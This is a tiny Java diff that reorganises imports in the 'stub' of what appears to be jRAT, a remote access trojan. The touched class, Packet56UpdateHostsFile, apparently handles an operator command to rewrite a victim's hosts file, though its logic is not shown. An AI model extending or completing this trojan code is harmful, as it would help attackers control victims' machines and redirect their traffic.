@@ -2,10 +2,10 @@ package pro.jrat.stub.packets.incoming;
 
 import java.io.FileWriter;
 
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet39HostEditResult;
 
-import com.redpois0n.common.OperatingSystem;
 
 public class Packet56UpdateHostsFile extends AbstractIncomingPacket {
 
